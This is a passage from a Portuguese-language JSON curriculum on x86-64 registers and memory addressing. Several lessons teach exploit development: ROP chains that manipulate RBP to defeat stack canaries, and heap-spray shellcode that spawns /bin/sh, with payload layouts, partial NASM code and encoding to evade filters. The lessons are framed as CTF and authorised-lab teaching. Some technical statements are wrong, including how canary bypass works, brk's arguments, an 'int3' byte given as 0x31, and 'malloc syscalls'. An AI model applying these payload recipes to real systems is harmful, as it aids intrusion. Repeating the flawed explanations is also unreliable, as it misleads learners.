                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Convenções de calling e layout de memória.",
                                "Programação em C/Assembly: Geração e leitura de código de baixo nível.",
                                "Análise de Vulnerabilidades: Stack overflows via offsets errados.",
                                "Engenharia Reversa: Ferramentas como IDA para binários obfuscados.",
                                "Debugging: Uso de GDB/WinDbg para runtime analysis."
                              ],
                              "realWorldApplication": "Em análise de malware ou exploits, identifique credenciais/strings em [rbp-off] para extração estática, ou debugue ROP chains rastreando params via RBP offsets em binários desprotegidos."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.2.2.3",
                            "name": "Manipular RBP em ROP chains",
                            "description": "Construir return-oriented programming (ROP) gadgets que alteram o RBP para bypass de proteções como stack canaries, testando em ambientes controlados.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender o Papel do RBP em Stack Frames e ROP",
                                  "subSteps": [
                                    "Analise o layout da stack em uma chamada de função usando GDB, identificando posições de RBP e RSP.",
                                    "Compile um binário simples com stack canary ativado (-fstack-protector) e examine o frame pointer em assembly.",
                                    "Estude como ROP chains tipicamente lidam com RBP para manter a ilusão de stack válido.",
                                    "Identifique cenários onde manipular RBP bypassa verificações de canary.",
                                    "Documente o overflow necessário para alcançar o RBP na stack."
                                  ],
                                  "verification": "Capture screenshots do GDB mostrando stack layout com RBP destacado e anote posições relativas.",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "GDB",
                                    "GCC com flags -fstack-protector -no-pie",
                                    "Binário vulnerável simples (ex: buffer overflow demo)"
                                  ],
                                  "tips": "Use 'info registers' e 'x/20gx $rsp' no GDB para visualizar a stack dinamicamente.",
                                  "learningObjective": "Compreender como RBP é usado para validação de stack e seu papel em ROP chains.",
                                  "commonMistakes": [
                                    "Ignorar o saved RBP acima do canary, levando a overwrites incorretos.",
                                    "Confundir RSP com RBP durante análise inicial."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Gadgets ROP para Manipulação de RBP",
                                  "subSteps": [
                                    "Use ROPgadget ou ROPper para escanear o binário por gadgets como 'pop rbp; ret' ou 'mov rbp, rax; ret'.",
                                    "Filtre gadgets que permitam controle direto ou indireto sobre RBP (ex: pop rbp, add rbp, etc.).",
                                    "Colete endereços de gadgets em uma lista priorizando aqueles com payloads limpos.",
                                    "Valide gadgets manualmente no GDB para confirmar comportamento.",
                                    "Planeje uma sequência: pop RBP com valor controlado seguido de gadgets para RSP."
                                  ],
                                  "verification": "Liste pelo menos 3 gadgets válidos com endereços e payloads confirmados via GDB step-through.",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "ROPgadget",
                                    "ROPper",
                                    "Binário vulnerável com ASLR desabilitado para testes iniciais"
                                  ],
                                  "tips": "Procure por 'pop rbp; pop rsi; ret' para chains mais complexas; ignore gadgets com registradores indesejados.",
                                  "learningObjective": "Localizar e validar gadgets específicos para manipulação precisa de RBP.",
                                  "commonMistakes": [
                                    "Selecionar gadgets com side-effects (ex: calls intermediárias).",
                                    "Não alinhar a stack após pop rbp, causando crashes."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Construir ROP Chain com Manipulação de RBP para Bypass Canary",
                                  "subSteps": [
                                    "Calcule o offset exato para overwrite do buffer até o RBP usando cyclic patterns (pwntools cyclic).",
                                    "Monte a chain: padding + pop rbp gadget + valor falso para RBP + gadgets para RSP + payload final (ex: system).",
                                    "Ajuste RBP para apontar para uma região controlada na stack pós-overflow, preservando canary aparentemente.",
                                    "Incorpore verificação de canary bypass: RBP falso aponta para stack limpa.",
                                    "Escreva script Python com pwntools para gerar e enviar payload."
                                  ],
                                  "verification": "Execute chain no GDB; confirme que canary check passa e RBP é controlado via 'info registers rbp'.",
                                  "estimatedTime": "2.5 hours",
                                  "materials": [
                                    "pwntools",
                                    "Python",
                                    "Binário vulnerável com netcat listener para remote testing"
                                  ],
                                  "tips": "Use 'leave; ret' gadget se disponível para simplificar manipulação de RBP/RSP simultânea.",
                                  "learningObjective": "Construir chains ROP funcionais que manipulam RBP para evadir proteções de stack.",
                                  "commonMistakes": [
                                    "Miscalcular offset, sobrescrita canary prematura.",
                                    "Não alinhar RSP para 8 bytes após manipulação de RBP."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar, Depurar e Refinar a Chain ROP",
                                  "subSteps": [
                                    "Execute exploit localmente com ASLR off; observe crash ou sucesso via GDB.",
                                    "Habilite ASLR e use leak de libc ou PIE base para endereços dinâmicos.",
                                    "Depure falhas: cheque alinhamento, ordem de gadgets e valores de RBP em breakpoints.",
                                    "Teste em ambiente remoto controlado (ex: Docker com binário exposto).",
                                    "Otimize chain para menor tamanho e confiabilidade, adicionando verificações de integridade."
                                  ],
                                  "verification": "Exploit bem-sucedido: shell ou exec de comando sem crash por canary; log de GDB confirma RBP manipulado.",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "GDB-PEDA ou GEF",
                                    "Docker para ambiente isolado",
                                    "pwntools para automação"
                                  ],
                                  "tips": "Set breakpoint em '__stack_chk_fail' para inspecionar falhas de canary.",
                                  "learningObjective": "Depurar e validar exploits ROP em cenários realistas controlados.",
                                  "commonMistakes": [
                                    "Esquecer leaks necessários com ASLR on.",
                                    "Overlook partial overwrites que corrompem RBP saved incorretamente."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário CTF vulnerável a buffer overflow (ex: picoCTF 'ROP Chain'), use ROPgadget para encontrar 'pop rbp; ret' em 0x40123e. Preencha buffer com 40 bytes padding + 0x40123e + 0xdeadbeef (RBP falso apontando para stack limpa) + 'leave; ret' + system address + '/bin/sh'. Isso bypassa canary ao fazer RBP pular verificação, ganhando shell.",
                              "finalVerifications": [
                                "Exploit bypassa stack canary sem trigger de __stack_chk_fail.",
                                "RBP é corretamente manipulado, confirmado via GDB registers.",
                                "Chain executa payload final (ex: system('/bin/sh')) com sucesso.",
                                "Funciona com ASLR parcial habilitado usando leaks.",
                                "Sem crashes por desalinhamento de stack pós-manipulação.",
                                "Script pwntools automatizado roda consistentemente em 10+ tentativas."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de gadgets RBP (pelo menos 80% válidos testados).",
                                "Chain ROP funcional em ambiente controlado com canary bypass.",
                                "Documentação completa de offsets, gadgets e depuração.",
                                "Tempo de execução dentro de estimados com sucesso reproduzível.",
                                "Análise de erros comuns evitados na chain final.",
                                "Integração de leaks para cenários realistas."
                              ],
                              "crossCurricularConnections": [
                                "Assembly x86-64: Leitura de gadgets e registradores.",
                                "Debugging: Uso avançado de GDB para análise de exploits.",
                                "Programação em Python: Automação com pwntools.",
                                "Arquitetura de Sistemas Operacionais: Stack frames e proteções.",
                                "Criptografia: Conexão com bypass de ASLR/DEP em ataques maiores."
                              ],
                              "realWorldApplication": "Em pentests e CTFs, manipular RBP em ROP chains permite bypass de stack canaries em binários legados, auxiliando na avaliação de vulnerabilidades em software real, sempre em ambientes autorizados e controlados para pesquisa em segurança."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.2.3",
                        "name": "Registrador RAX em acesso a memória e syscalls",
                        "description": "O registrador RAX é usado como acumulador em chamadas de sistema (syscall) no Linux x86-64, carregando o número da syscall e recebendo valores de retorno como ponteiros de heap. Crucial para análise de alocações dinâmicas e injeção de código.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.2.3.1",
                            "name": "Carregar e interpretar RAX em chamadas de sistema",
                            "description": "Identificar padrões 'mov rax, N; syscall' em assembly, onde N é o número da syscall (ex: 12 para brk), rastreando argumentos em RDI/RSI e retornos em RAX.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a convenção de chamadas de sistema x86-64 e o papel de RAX",
                                  "subSteps": [
                                    "Estude a convenção Linux x86-64: RAX armazena o número da syscall antes de 'syscall'.",
                                    "Memorize exemplos: 12 para brk (alocação de heap), 60 para exit, 1 para write.",
                                    "Analise o fluxo: registradores de argumentos (RDI=arg1, RSI=arg2, etc.) são preparados antes.",
                                    "Identifique a sequência padrão: 'mov rax, N; syscall' em desmontagens.",
                                    "Revise a tabela de syscalls do kernel Linux (man 2 syscall)."
                                  ],
                                  "verification": "Escreva um resumo de 100 palavras explicando o uso de RAX em syscalls, citando 3 exemplos.",
                                  "estimatedTime": "25 minutes",
                                  "materials": [
                                    "Tabela de syscalls Linux (syscall table PDF ou online)",
                                    "Exemplo de código assembly simples com syscall",
                                    "Ferramenta objdump ou Ghidra para desmontar binários"
                                  ],
                                  "tips": "Sempre verifique a arquitetura (x86-64 vs x86) para evitar confusões com int 0x80.",
                                  "learningObjective": "Dominar como RAX é usado para selecionar e invocar syscalls no Linux x86-64.",
                                  "commonMistakes": [
                                    "Confundir convenção x86-64 com x86 32-bit (usa EAX e int 0x80)",
                                    "Ignorar que argumentos vão em RDI/RSI/etc., não em pilha",
                                    "Não consultar a tabela oficial de syscalls"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e decodificar o padrão 'mov rax, N; syscall' em assembly",
                                  "subSteps": [
                                    "Carregue um binário estático em uma desmontadora (ex: objdump -d binary).",
                                    "Procure por 'mov rax, 0xC' ou 'mov rax, 12' seguido imediatamente por 'syscall'.",
                                    "Anote o valor N em RAX e consulte a tabela para nomear a syscall (ex: 12=brk).",
                                    "Marque o contexto: código antes (preparação de args) e depois (checagem de retorno).",
                                    "Pratique em 3-5 locais diferentes no mesmo binário."
                                  ],
                                  "verification": "Liste 3 instâncias de 'mov rax, N; syscall' de um binário desmontado, com N e nome da syscall.",
                                  "estimatedTime": "30 minutes",
                                  "materials": [
                                    "Binário ELF estático simples (ex: programa que usa brk)",
                                    "Objdump, radare2 ou Ghidra",
                                    "Tabela de syscalls (ex: https://filippo.io/linux-syscall-table/)"
                                  ],
                                  "tips": "Use grep ou busca por 'rax.*syscall' em desmontagens textuais para acelerar.",
                                  "learningObjective": "Localizar e interpretar visualmente padrões de carregamento de RAX em código assembly.",
                                  "commonMistakes": [
                                    "Interpretar valores hex/dec incorretamente (0xC = 12)",
                                    "Confundir mov imediato com mov de registrador",
                                    "Ignorar syscalls dinâmicas (rax carregado de memória)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Rastrear argumentos (RDI/RSI) e preparar interpretação do retorno em RAX",
                                  "subSteps": [
                                    "Trace para trás: identifique mov rdi, arg1; mov rsi, arg2 antes do mov rax.",
                                    "Para brk(12): tipicamente rsi=size, rdi=NULL; rastreie valores concretos.",
                                    "Simule execução: anote estado de registradores pré-syscall.",
                                    "Pós-syscall: observe cmp rax,0 ou test rax,rax para checar erros (-errno em RAX).",
                                    "Registre retornos: sucesso=endereço heap para brk, -1 para falha."
                                  ],
                                  "verification": "Desenhe um diagrama de fluxo mostrando registradores antes/depois de uma syscall brk.",
                                  "estimatedTime": "35 minutes",
                                  "materials": [
                                    "Binário com brk syscall (ex: malloc stub)",
                                    "Debugger como GDB (gdb -q binary; disassemble main)",
                                    "Papel ou ferramenta de diagrama (draw.io)"
                                  ],
                                  "tips": "Use 'info registers' no GDB para ver RAX/RDI em breakpoints pré-syscall.",
                                  "learningObjective": "Rastrear fluxo completo de args e retorno envolvendo RAX em syscalls.",
                                  "commonMistakes": [
                                    "Esquecer convenção de args AMD64 (RDI primeiro)",
                                    "Não notar retornos negativos como erros (RAX < 0)",
                                    "Perder rastreamento em loops ou funções aninhadas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Interpretar e validar chamadas de sistema com foco em RAX",
                                  "subSteps": [
                                    "Compile e desmonte seu próprio assembly: mov rax,12; syscall; verifique com strace.",
                                    "Compare desmontagem com rastreio dinâmico (strace -e trace=brk ./binary).",
                                    "Analise erros: se RAX=-ENOMEM após brk, interprete como falha de memória.",
                                    "Documente 2 cenários: sucesso (RAX=heap ptr) vs falha (RAX=-errno).",
                                    "Teste em binário real de exploit ou malware sample."
                                  ],
                                  "verification": "Produza relatório de 1 página analisando uma syscall completa em um binário real.",
                                  "estimatedTime": "40 minutes",
                                  "materials": [
                                    "NASM para assembly customizado",
                                    "Strace para rastreio de syscalls",
                                    "Sample binário de CTF com syscalls (ex: picoCTF)"
                                  ],
                                  "tips": "Strace mostra syscalls reais, confirmando sua interpretação estática.",
                                  "learningObjective": "Integrar identificação estática com validação dinâmica de RAX em syscalls.",
                                  "commonMistakes": [
                                    "Não usar strace para validar desmontagem",
                                    "Confundir ponteiro de retorno com tamanho",
                                    "Ignorar alinhamento de heap em brk"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário que implementa malloc customizado, identifique 'mov rax, 0xc; mov rdi, 0x0; mov rsi, 0x1000; syscall' como brk(NULL, 4096) para estender heap. Rastreie: pré-syscall RSI=0x1000 (tamanho desejado); pós-syscall RAX=novo_end_brk ou -ENOMEM. Use strace para confirmar: brk(NULL) = 0x555555559000.",
                              "finalVerifications": [
                                "Identifica corretamente 'mov rax, 12; syscall' como brk em qualquer desmontagem.",
                                "Rastreia args RDI/RSI para pelo menos 3 syscalls diferentes.",
                                "Interpreta retornos: distingue sucesso (RAX >=0) de erro (RAX <0).",
                                "Valida com strace ou GDB em binário real.",
                                "Explica impacto em segurança (ex: heap spray via brk).",
                                "Documenta padrão completo em relatório curto."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação do padrão RAX-syscall (100% em 5 exemplos).",
                                "Correção no rastreamento de args (RDI/RSI/RAX) sem erros de convenção.",
                                "Interpretação precisa de retornos, incluindo códigos de erro.",
                                "Uso efetivo de ferramentas (objdump/strace/GDB) com evidências.",
                                "Profundidade de análise: conecta a contexto de memória/segurança.",
                                "Clareza na documentação/diagramas de fluxo."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Mecanismos de kernel (brk/sbrk para gerenciamento de heap).",
                                "Arquitetura de Computadores: Convenções de chamada AMD64 e registradores.",
                                "Segurança Computacional: Reverse engineering de binários maliciosos usando syscalls.",
                                "Programação em Baixo Nível: Assembly x86-64 e depuração dinâmica.",
                                "Análise de Malware: Detecção de primitivas de alocação em payloads."
                              ],
                              "realWorldApplication": "Em análise forense de malware ou desenvolvimento de exploits, identificar syscalls via RAX permite mapear alocações de memória (brk para heap spray), depurar crashes por erros de syscall, ou engenharia reversa de rootkits que manipulam brk para esconder payloads."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.2.3.2",
                            "name": "Analisar retornos de alocação heap em RAX",
                            "description": "Examinar syscalls como mmap ou brk que retornam ponteiros de heap em RAX, correlacionando com acessos subsequentes via [rax] em código malware ou shellcodes.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Syscalls de Alocação de Heap (brk e mmap)",
                                  "subSteps": [
                                    "Estude a syscall brk: parâmetros em RDI (incremento), retorno em RAX com novo endereço do programa break.",
                                    "Estude a syscall mmap: parâmetros em RDI (addr), RSI (length), etc., retorno em RAX com ponteiro base ou MAP_FAILED.",
                                    "Compare brk (expande sbrk) vs mmap (alocações anônimas ou mapeadas).",
                                    "Consulte man pages: man 2 brk e man 2 mmap para convenções x86_64 Linux.",
                                    "Identifique números de syscall: brk=12, mmap=9."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito como brk/mmap retornam ponteiros de heap em RAX em caso de sucesso.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "man 2 brk",
                                    "man 2 mmap",
                                    "Documentação Linux syscall table (x86_64)"
                                  ],
                                  "tips": "Use 'strace' em programas C simples com malloc para observar brk/mmap reais.",
                                  "learningObjective": "Dominar os mecanismos e retornos das syscalls de heap allocation em registrador RAX.",
                                  "commonMistakes": [
                                    "Confundir brk com sbrk (sbrk é wrapper libc)",
                                    "Ignorar verificação de erro (MAP_FAILED = -1)",
                                    "Esquecer convenção calling x86_64 (RDI primeiro param)"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Retornos de Syscall em RAX no Assembly",
                                  "subSteps": [
                                    "Localize instrução 'syscall' em desassembly (ex: objdump ou IDA/Ghidra).",
                                    "Examine registradores pós-syscall: RAX contém retorno (ponteiro heap ou erro).",
                                    "Verifique branches condicionais: test %rax,%rax ou cmp $0,%rax para checar sucesso.",
                                    "Rastreie setup pré-syscall: mov para RDI/RSI para params de brk/mmap.",
                                    "Use debugger para pausar pós-syscall e inspecionar RAX (ex: info reg rax no GDB)."
                                  ],
                                  "verification": "Em um binário de exemplo, aponte exatamente onde RAX recebe o ponteiro heap pós-syscall.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "GDB ou x64dbg",
                                    "Exemplo assembly simples com brk/mmap",
                                    "objdump ou Ghidra"
                                  ],
                                  "tips": "Defina breakpoint em 'syscall' e 'stepi' para observar RAX imediatamente após.",
                                  "learningObjective": "Reconhecer padrões de syscall e captura de retorno em RAX para alocações heap.",
                                  "commonMistakes": [
                                    "Não distinguir RAX pré vs pós-syscall",
                                    "Confundir syscall numbers (use /usr/include/asm/unistd_64.h)",
                                    "Ignorar alinhamento de página em mmap"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Correlacionar RAX com Acessos de Memória [RAX]",
                                  "subSteps": [
                                    "Busque usos de RAX como base: mov [rax], ..., mov ...,[rax+offset], etc.",
                                    "Rastreie fluxos: de syscall -> RAX -> store/load em [rax*scale + disp].",
                                    "Analise scaling/indexing: lea rax,[rax+rdi*8] para estruturas heap.",
                                    "Verifique bounds checks: cmp rdi,[rax-8] ou loops com add rax,8.",
                                    "Use data flow analysis em tools como angr ou manualmente em debugger."
                                  ],
                                  "verification": "Desenhe um grafo de dados mostrando syscall -> RAX -> [rax] em um snippet assembly.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Debugger com memória view (GDB pwndbg)",
                                    "Exemplos de shellcode heap spray",
                                    "Ghidra ou Binary Ninja"
                                  ],
                                  "tips": "Cores em GDB: 'x/20gx $rax' para dump heap pós-alocação.",
                                  "learningObjective": "Rastrear propagação de ponteiro heap de RAX para acessos de memória indiretos.",
                                  "commonMistakes": [
                                    "Perder renomeações de RAX (mov rbx,rax)",
                                    "Assumir RAX sempre heap sem contexto",
                                    "Ignorar offsets negativos para headers"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar Análise em Contextos de Malware e Shellcodes",
                                  "subSteps": [
                                    "Carregue sample de malware/shellcode em debugger/disassembler.",
                                    "Identifique padrões: heap alloc para shellcode stage2 ou ROP chains.",
                                    "Correlacione [rax] com payloads: writes de shellcode ou reads de input.",
                                    "Simule execução: aloque heap manualmente e compare com RAX do malware.",
                                    "Documente IOCs: tamanhos mmap suspeitos (ex: 0x1000+), acessos OOB."
                                  ],
                                  "verification": "Analise um sample real e liste 3 correlações syscall-RAX-[rax] com propósitos maliciosos.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Malware samples (VirusTotal ou theZoo)",
                                    "Cuckoo Sandbox traces",
                                    "Radare2 ou Cutter"
                                  ],
                                  "tips": "Combine com strace do processo para validar heap ops.",
                                  "learningObjective": "Aplicar rastreamento RAX em cenários reais de análise de ameaças.",
                                  "commonMistakes": [
                                    "Focar só em sucesso, ignorar error paths",
                                    "Não considerar ASLR (use PIE samples)",
                                    "Subestimar obfuscation (xor rax, key)"
                                  ]
                                }
                              ],
                              "practicalExample": "Em shellcode: mov rdi,0x1000; mov rax,9; syscall  # mmap(0,0x1000,...);  mov BYTE PTR [rax],0x31  # int3 breakpoint no heap. RAX pós-syscall é base heap, [rax] armazena payload.",
                              "finalVerifications": [
                                "Explique diferença brk vs mmap em retornos RAX.",
                                "Identifique em desassembly: syscall brk -> test rax,rax -> mov [rax],shellcode.",
                                "Simule em GDB: alocação heap e dump [rax+0x10].",
                                "Analise sample malware: trace 2 acessos [rax] pós-heap alloc.",
                                "Discuta detecção: hooks em mmap para EDR."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de retornos RAX (100% em exemplos).",
                                "Profundidade de rastreamento: pelo menos 3 hops RAX -> memória.",
                                "Correlação contextual: liga a malware behaviors.",
                                "Uso correto de tools: GDB traces limpos.",
                                "Análise de erros: identifica falhas como -1 em RAX.",
                                "Documentação clara: diagramas ou screenshots."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Gerenciamento de memória virtual (brk/mmap).",
                                "Assembly x86_64: Convenções de chamada e registradores.",
                                "Engenharia Reversa: Análise estática/dinâmica de binários.",
                                "Segurança de Software: Mitigações ASLR/DEP em heap exploits."
                              ],
                              "realWorldApplication": "Em análise de malware, detectar shellcodes que alocam heap via mmap(brk) em RAX para injetar payloads, permitindo triage rápido de amostras em IR/Threat Hunting."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.2.3.3",
                            "name": "Usar RAX em shellcodes para heap spraying",
                            "description": "Desenvolver shellcodes que verificam e utilizam valores em RAX para sprays de heap, explorando alocações dinâmicas em binários vulneráveis a heap overflow.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Papel de RAX em Heap Spraying e Syscalls",
                                  "subSteps": [
                                    "Estude a documentação de registradores x86-64, focando em RAX como acumulador para syscalls e ponteiro de dados dinâmicos.",
                                    "Analise exemplos de heap spraying em exploits, identificando como alocações repetidas preenchem o heap com payloads shellcode.",
                                    "Revise heap overflow basics: como overflows corrompem metadados (malloc/free chunks) para controlar alocações subsequentes.",
                                    "Examine código assembly onde RAX é usado para verificar endereços heap válidos antes de spraying.",
                                    "Pratique disassemblando binários com gdb para observar RAX em alocações dinâmicas."
                                  ],
                                  "verification": "Resuma em um diagrama como RAX interage com brk/sbrk syscalls em heap spraying; valide com um colega ou auto-teste.",
                                  "estimatedTime": "1-2 hours",
                                  "materials": [
                                    "Documentação Intel x86-64 manuals",
                                    "GDB ou Pwntools",
                                    "Exemplos de heap exploits de pwn.college"
                                  ],
                                  "tips": "Use 'info registers rax' no GDB para rastrear valores dinâmicos; foque em cenários 64-bit Linux.",
                                  "learningObjective": "Explicar como RAX facilita verificações dinâmicas em shellcodes para heap spraying eficaz.",
                                  "commonMistakes": [
                                    "Confundir RAX com RSP/heap base",
                                    "Ignorar ASLR em testes iniciais",
                                    "Não considerar chunk alignment em malloc"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Desenvolver Shellcode Básico para Ler e Verificar RAX",
                                  "subSteps": [
                                    "Escreva um shellcode em NASM que leia RAX via syscall (ex: read ou getpid para testar).",
                                    "Adicione lógica condicional: compare RAX com um valor heap esperado (ex: via brk syscall).",
                                    "Inclua loop para múltiplas verificações de RAX, simulando detecção de spray sucesso.",
                                    "Compile para shellcode raw bytes usando nasm -f elf64 e objcopy.",
                                    "Teste o shellcode standalone com um loader simples em Python (pwntools shellcraft)."
                                  ],
                                  "verification": "Execute shellcode e confirme via strace ou GDB que RAX é lido corretamente sem crash.",
                                  "estimatedTime": "2-3 hours",
                                  "materials": [
                                    "NASM assembler",
                                    "Pwntools Python library",
                                    "GDB-Peda ou Pwntools GDB"
                                  ],
                                  "tips": "Use 'xor rax, rax' para zerar antes de syscalls; evite null bytes com técnicas de encoding.",
                                  "learningObjective": "Criar shellcode que acessa e valida valores em RAX para decisões de controle de fluxo.",
                                  "commonMistakes": [
                                    "Syscalls inválidas em RAX (use mov para setup)",
                                    "Bad chars em shellcode quebrando strings",
                                    "Não alinhar stack para ROP-like chains"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Heap Spraying Guiado por RAX no Shellcode",
                                  "subSteps": [
                                    "Modifique o shellcode para usar RAX como ponteiro base para spraying: aloque chunks via repeated malloc syscalls.",
                                    "Inclua verificação: se RAX aponta para chunk válido (checagem de magic bytes), execute payload; senão, spray mais.",
                                    "Adicione loop de spraying: escreva nop sled + shellcode em múltiplos chunks usando write syscall.",
                                    "Otimize para eficiência: limite sprays para evitar OOM, use RAX para trackear próximo chunk livre.",
                                    "Encode shellcode para bypass filtros (ex: polymorphic via RAX mutations)."
                                  ],
                                  "verification": "Simule em userland: confirme spraying via hexdump do heap (/proc/self/maps).",
                                  "estimatedTime": "3-4 hours",
                                  "materials": [
                                    "Libc source para malloc hooks",
                                    "Checksec para mitigações",
                                    "Binário vulnerável com heap overflow (ex: ret2libc challenge)"
                                  ],
                                  "tips": "Monitore com 'vmmap' no GDB; use RAX como offset relativo para ASLR bypass parcial.",
                                  "learningObjective": "Integrar RAX-driven verificações em loops de heap spraying dentro de shellcode.",
                                  "commonMistakes": [
                                    "Overflow prematuro sem spray",
                                    "RAX sobrescrito por malloc",
                                    "Ignorar tcache/fastbins em glibc moderna"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e Refinar Shellcode em Binário Vulnerável a Heap Overflow",
                                  "subSteps": [
                                    "Compile um binário C vulnerável com heap overflow (ex: strcpy em user buffer).",
                                    "Integre shellcode no exploit: trigger overflow para controlar RAX, então execute spray.",
                                    "Debug com Pwntools: envie payload com cyclic patterns para encontrar offsets.",
                                    "Execute remotamente (ex: pwn.college server) e verifique RCE via shell spawn.",
                                    "Itere: ajuste baseado em crashes, adicionando checks RAX para robustez."
                                  ],
                                  "verification": "Obtenha shell interativa estável em 3/5 runs; capture flags ou cat /flag.",
                                  "estimatedTime": "2-4 hours",
                                  "materials": [
                                    "Binário vulnerável custom ou CTF challenge",
                                    "Pwntools para scripting",
                                    "Remote server para testes reais"
                                  ],
                                  "tips": "Desative mitigações iniciais (pie, nx off); escale para full ASLR com leak via RAX.",
                                  "learningObjective": "Aplicar shellcode RAX-heap spray em exploit end-to-end com sucesso reproduzível.",
                                  "commonMistakes": [
                                    "Offset incorreto para RAX control",
                                    "Spray excessivo causando segfault",
                                    "Não limpar RAX pós-syscall"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário com heap overflow via gets(), corrompa o chunk fd pointer para apontar RAX para um endereço sprayable. Shellcode: mov rdi, rax; syscall (malloc loop); verifica se [rax] == 0xdeadbeef (marker); se sim, jmp payload; senão, spray 100 chunks com nop+execve(/bin/sh). Código NASM: section .text; global _start; _start: mov rax, 12; syscall; cmp rax, 0x123456; je shell; spray_loop: ...",
                              "finalVerifications": [
                                "Shellcode lê e usa RAX sem crash em GDB.",
                                "Heap contém múltiplos chunks sprayados verificáveis via hexdump.",
                                "Exploit triggera RCE em binário vulnerável 80% das vezes.",
                                "RAX-driven decision altera fluxo corretamente (log via int3).",
                                "Funciona com ASLR parcial (leak simulado).",
                                "Nenhum bad char introduzido no payload."
                              ],
                              "assessmentCriteria": [
                                "Precisão na manipulação de RAX (sem overwrites acidentais).",
                                "Eficiência do spray (alocações <100 chunks para sucesso).",
                                "Robustez contra mitigações básicas (ASLR, stack canary off).",
                                "Clareza do código shellcode (comentado e modular).",
                                "Reprodutibilidade em ambiente remoto.",
                                "Análise de falhas documentada."
                              ],
                              "crossCurricularConnections": [
                                "Assembly x86-64 e Syscalls (fundamentos de baixo nível).",
                                "Gerenciamento de Memória em C/Operating Systems (malloc internals).",
                                "Reverse Engineering e Debugging (GDB/Pwntools).",
                                "Cryptography (bypass via encoding shellcode).",
                                "Ethical Hacking e CTFs (aplicação prática)."
                              ],
                              "realWorldApplication": "Em pentests e red teaming, essa técnica permite exploits de heap em serviços reais (ex: web servers com uaf), bypassing ASLR parcial via leaks dinâmicos em RAX, comum em vulns como CVE-2020 heap issues em browsers ou libc."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.3.3",
                    "name": "Modos de Endereçamento de Memória",
                    "description": "Modos direto, indireto, baseado e indexado para acessar locais de memória.",
                    "individualConcepts": [
                      {
                        "id": "10.1.3.3.1",
                        "name": "Modo de Endereçamento Direto",
                        "description": "O modo direto utiliza o endereço de memória especificado diretamente na instrução assembly, permitindo acesso imediato a um local fixo na memória sem cálculos adicionais.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.3.1.1",
                            "name": "Identificar instruções em modo direto",
                            "description": "Reconhecer instruções assembly x86/x64 como MOV eax, [0x401000] em código desmontado, diferenciando de outros modos pelo endereço absoluto na operand.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a definição e características do modo de endereçamento direto",
                                  "subSteps": [
                                    "Leia a definição: Modo direto usa endereço de memória absoluto imediato nos operandos, sem cálculo ou registradores indiretos.",
                                    "Identifique a sintaxe típica: [endereço_hex] como [0x401000] em instruções como MOV reg, [addr].",
                                    "Estude exemplos canônicos de x86/x64: MOV eax, [0x401000] vs. outros modos.",
                                    "Anote diferenças chave: Endereço fixo, sem base/index/scale.",
                                    "Revise documentação oficial Intel/AMD para modos de endereçamento."
                                  ],
                                  "verification": "Escreva uma definição em suas palavras e liste 3 características únicas do modo direto.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Documentação Intel x86 manuals (PDF), notepad para anotações",
                                  "tips": "Foque em 'absoluto' vs. 'relativo'; desenhe diagramas de operandos.",
                                  "learningObjective": "Definir precisamente o modo direto e suas assinaturas sintáticas em assembly.",
                                  "commonMistakes": "Confundir com modo imediato (valor direto, não endereço) ou indireto via registrador."
                                },
                                {
                                  "stepNumber": 2,
